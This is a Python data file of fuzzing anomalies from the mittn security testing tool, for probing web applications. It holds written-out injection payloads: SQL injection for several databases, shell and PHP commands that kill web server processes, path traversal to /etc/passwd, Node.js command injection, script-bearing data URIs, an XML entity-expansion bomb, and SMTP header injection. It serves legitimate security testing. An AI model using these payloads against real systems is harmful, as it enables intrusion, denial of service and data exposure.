# -*- coding: utf-8 -*-
"""List of static anomalies that can be injected. Before using, replace the
email address nobody@mittn.org with a working email address you have control over.
If email injections are successful, that address gets interesting email.
"""

anomaly_list = [
    # Valid cases
    "A harmless string",  # Something easy to start with
    str('\xc3\xa5\xc3\xa4\xc3\xb6'),  # Scandinavian characters as Unicode UTF-8

    # SQL injections
    "' --",  # SQL: End statement, start comment
    "' or 'x'='x' --",  # SQL: always true for strings
    "' or 1=1 --",  # SQL: End statement, evaluate to always true
    "1 OR 1=1 --",  # SQL: Always true for numbers
    "'; select datname from pg_database; --",  # PostgreSQL: list all tables
    "\\''; select datname from pg_database; --",  # PostgreSQL: list all tables, extra escape
    "&apos;&59; select datname from pg_database&59; --",  # PostgreSQL: list all tables, HTML entities
    "'; SHOW DATABASES; --",  # MySQL: list all databases
    "\\''; SHOW DATABASES; --",  # MySQL: list all databases, extra escape
    "&apos;&59; SHOW DATABASES&59; --",  # MySQL: list all databases, HTML entities
    "'; select global_name from global_name; --",  # Oracle: show current database
    "\\''; select global_name from global_name; --",  # Oracle: show current database, extra escape
    "&apos;&59; select global_name from global_name&59; --",  # Oracle: show current database, HTML entities
    "'; select * from SQLITE_MASTER; --",  # SQLite: show master table
    "\\''; select * from SQLITE_MASTER; --",  # SQLite: show master table, extra escape
    "&apos;&59; select * from SQLITE_MASTER&59; --",  # SQLite: show master table, HTML entities
    "'; select @@version; --",  # MS SQL Server: show DB details
    "\\''; select @@version; --",  # MS SQL Server: show DB details, extra escape
    "&apos;&59; select @@version&59; --",  # MS SQL Server: show DB details, HTML entities

    # Shell injection
    r"`echo >injected.exe`",  # Backtick exec
    r"| echo >injected.exe",  # Pipe exec
    "../" * 15 + "etc/passwd",  # /etc/passwd
    "`killall -g apache php nginx python perl node`",  # Backtick exec
    "| killall -g apache php nginx python perl node",  # Pipe exec
    "`ping localhost`",  # Backtick exec intended to cause a timeout
    "' . `killall -g apache php nginx python perl node` . '",  # Backtick exec, single quote PHP insert
    '" . `killall -g apache php nginx python perl node` . "',  # Backtick exec, double quote PHP insert
    '" . system(\'killall -g apache php nginx python perl node\'); . "',  # E.g. PHP system exec, double quote insert
    "' . system(\'killall -g apache php nginx python perl node\'); . '",  # E.g. PHP system exec, single quote insert
    "var sys = require('sys'); sys.print('POSSIBLE_INJECTION_PROBLEM');",  # Node.js command injection
    "var exec = require('child_process').exec; exec('ping 127.0.0.1');",  # Node.js command injection, aim at timeout
    "'; var exec = require('child_process').exec; exec('ping 127.0.0.1');",  # Node.js command injection, aim at timeout

    # PHP injection
    '<?php exit(1) ?>',  # Add PHP block that tries to exit with a nonzero return code
    '><?php exit(1) ?>',  # Add PHP block that tries to exit with a nonzero return code
    '?>',  # End PHP block (or <?xml element for that matter)
    '<?php',  # Start PHP block

    # URI injections
    "&access_token=POSSIBLE_INJECTION_PROBLEM&",
    "?access_token=POSSIBLE_INJECTION_PROBLEM&",
    "?access_token=POSSIBLE_INJECTION_PROBLEM&",
    "&amp;access_token=POSSIBLE_INJECTION_PROBLEM&amp;",
    'javascript:alert(1)',
    'data:text/plain;charset=utf-8;base64,UE9TU0lCTEVfSU5KRUNUSU9OX1BST0JMRU0=',
    'data:application/javascript;charset=utf-8;base64,PHNjcmlwdD5hbGVydCgwKTwvc2NyaXB0Pg==',
    'data:text/html;charset=utf-8;base64,PGh0bWw+PHNjcmlwdD5hbGVydCgwKTwvc2NyaXB0PjwvaHRtbD4=',

    # Important numbers
    -1,
    0,
    1,
    2,
    2 ** 8,
    -2 ** 8,
    2 ** 16,
    -2 ** 16,
    2 ** 32,
    -2 ** 32,
    2 ** 64,
    -2 ** 64,
    2 ** 128,
    -2 ** 128,
    2 ** 256,
    -2 ** 256,
    1e-16,
    1e-32,
    '\n1',
    '1\n',
    2.2250738585072011e-308,  # CVE-2010-4645
    float('inf'),  # Infinity
    float('-inf'),  # Minus Infinity
    float('nan'),  # Not A Number

    # Truth values & stuff that isn't
    True,
    False,
    None,
    [],  # Empty list (serializes into an empty list in JSON)
    {},  # Empty dict (serializes into an empty dict in JSON)

    # Strings
    '',  # Nothingness
    '\n',  # LF
    '\r\n',  # CRLF
    '\n\r',  # LFCR
    ';',  # End a statement
    '{{',  # Start moustache
    '}}',  # End moustache
    '"',  # Close a string
    "'",  # Close a string
    '/*',  # Start of comment
    '#',  # Start of comment
    '//',  # Start of comment
    r'%',  # Start of comment
    '--',  # Start of SQL comment
    unichr(0),  # NULL
    unichr(0) + 'xxxxxxxx',  # NULL followed by more data
    unichr(0x1a),  # ctrl-z (end of stream)
    "\xff\xfe",  # Illegal unicode as string
    "\xff\xff",  # Illegal unicode as string
    '\t',  # tab
    '<?xml version="1.0"?><!DOCTYPE exp [ <!ENTITY exp "exp"><!ENTITY expa "' + '&exp;' * 100 + '"><!ENTITY expan "' + '&expa;' * 100 + '"><!ENTITY expand "' + '&expan;' * 100 + '"> ]><exp>&expand;</exp>',  # XML entity expansion

    # Format strings
    r'%s',
    r'%d',

    # Email
    'root@[127.0.0.1]',  # Well-formed but localhost
    'root@localhost',  # Well-formed but localhost
    '@mittn.org',  # No user
    '@',  # No user or domain
    'nobody@mittn.org\nCc:nobody@mittn.org',  # Header injection
    'nobody@mittn.org\r\nCc:nobody@mittn.org',  # Header injection
    '\r\n.\r\n\r\nMAIL FROM:<root>\r\nRCPT TO:<nobody@mittn.org>\r\nDATA\r\nPOSSIBLE_INJECTION_PROBLEM\r\n.\r\n',  # SMTP injection

    # Long strings
    "A" * 256,
    "A" * 1025,
    "A" * 2049,
    ":-) =) XD o_O" * 10000  # Rendering a lot of animated emoticons can cause pain
    # Enable following to allow 1 megabyte inputs
    #    "A" * 1024 * 1024
]
